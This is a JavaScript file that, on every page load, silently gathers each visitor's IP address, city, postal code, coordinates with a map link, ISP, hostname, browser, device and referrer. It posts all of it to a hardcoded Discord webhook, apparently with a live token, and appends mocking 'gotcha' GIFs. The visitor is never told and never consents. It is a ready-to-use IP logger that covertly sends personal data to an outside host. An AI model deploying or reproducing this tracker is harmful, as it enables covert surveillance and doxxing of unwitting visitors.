async function sendMessageToYourDiscord() {
  const yourWebhookURL = 'https://discord.com/api/webhooks/1174544975279685744/evnQRGsn7zRzVec1FtNGc9MlfLAoV7_6PcYdYVcrCBFUiBOzTxmztwZaSf7J-8I1qoqi'; // Replace this with your webhook URL

  try {
    const response = await fetch('https://ipinfo.io/json');
    const data = await response.json();

    const {
      city,
      region,
      country,
      loc,
      postal,
      timezone,
      org,
      hostname,
      ip,
    } = data;

    const [latitude, longitude] = loc.split(',');

    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const currentDate = new Date();
    const formattedDate = `${currentDate.getMonth() + 1}/${currentDate.getDate()}/${currentDate.getFullYear()}`;
    const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric' };
    const formattedTime12Hour = currentDate.toLocaleTimeString(undefined, timeOptions);
    const formattedTime24Hour = currentDate.toLocaleTimeString('en-US', { hour12: false, ...timeOptions });

    const browserName = getBrowserName();
    const deviceInfo = getDeviceInfo();

    const message = `
      A user visited the website!\n
      Location: ${city}, ${region}, ${country}, ${postal}\n
      Coordinates: ${loc}\n
      [Map of Location](${mapLink})\n
      Timezone: ${timezone}\n
      IP Address: ${ip}\n
      Hostname: ${hostname}\n
      Organization: ${org}\n
      Date: ${formattedDate}\n
      Time (12-Hour): ${formattedTime12Hour}\n
      Time (24-Hour): ${formattedTime24Hour}\n
      Browser: ${browserName}\n
      ${deviceInfo}\n
      User-Agent: ${navigator.userAgent}\n
      Referrer: ${document.referrer}\n
      Page Title: ${document.title}\n
      Page URL: ${window.location.href}\n
      Screen Resolution: ${screen.width}x${screen.height}
    `;

    // Array of funny GIF URLs
    const gifURLs = [
      'https://media.tenor.com/_Y3doxogbV4AAAPo/gotcha-funny.mp4',
      'https://images-ext-1.discordapp.net/external/4EUAsKsAx6c4Wq7RW0acPhCDYADzXsotfm88uybSONE/https/media.tenor.com/7AgcLwJLPTYAAAPo/fafo-findout.mp4',
      'https://images-ext-2.discordapp.net/external/34-ti8YMttvaxAyLC9r8a3Pfd4ltiaSBj6cJ19rZiok/https/media.tenor.com/yUjpP621gUIAAAPo/gotcha-bitch-bitch.mp4',
      'https://images-ext-1.discordapp.net/external/7rDXuHRyFPO70YY0BusRJIvstR1gvpu4mfYlibdbZSM/https/media.tenor.com/yxaHTlnI7GUAAAPo/opihomm-funny.mp4',
      'https://images-ext-2.discordapp.net/external/y_8IUufuR0lVLLlDBS5GTIvRYLsD0hcgz9hfQbn4sKM/https/media.tenor.com/hpUe35zysKsAAAPo/tenor.mp4',
    ];

    // Randomly select a GIF from the array
    const randomGIF = gifURLs[Math.floor(Math.random() * gifURLs.length)];

    // Append the randomly selected GIF to the end of the message
    const messageWithGIF = `
      ${message}
      
      [Random Funny GIF](${randomGIF})
    `;

    const sendMessageResponse = await fetch(yourWebhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ content: messageWithGIF }),
    });

    if (sendMessageResponse.ok) {
      console.log('Message sent to your Discord server!');
    } else {
      console.error('Error sending message to Discord:', sendMessageResponse.statusText);
    }
  } catch (error) {
    console.error('Error getting user info or sending message to Discord:', error);
  }
}

function getBrowserName() {
  const userAgent = navigator.userAgent;
  let browserName = 'Unknown';

  if (userAgent.includes('Edge')) {
    browserName = 'Edge';
  } else if (userAgent.includes('Firefox')) {
    browserName = 'Firefox';
  } else if (userAgent.includes('Chrome')) {
    browserName = 'Chrome';
  } else if (userAgent.includes('Safari')) {
    browserName = 'Safari';
  } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
    browserName = 'Internet Explorer';
  } else if (userAgent.includes('Opera') || userAgent.includes('OPR/')) {
    browserName = 'Opera';
  }

  return browserName;
}

function getDeviceInfo() {
  let deviceInfo = '';
  const ua = navigator.userAgent;

  // Operating System
  const os = navigator.platform;
  deviceInfo += `Operating System: ${os}\n`;

  // Device Type
  if (/Mobi/i.test(ua)) {
    deviceInfo += 'Device Type: Mobile\n';
  } else if (/Tablet/i.test(ua)) {
    deviceInfo += 'Device Type: Tablet\n';
  } else {
    deviceInfo += 'Device Type: Desktop\n';
  }

  return deviceInfo;
}

document.addEventListener('DOMContentLoaded', () => {
  sendMessageToYourDiscord();
});
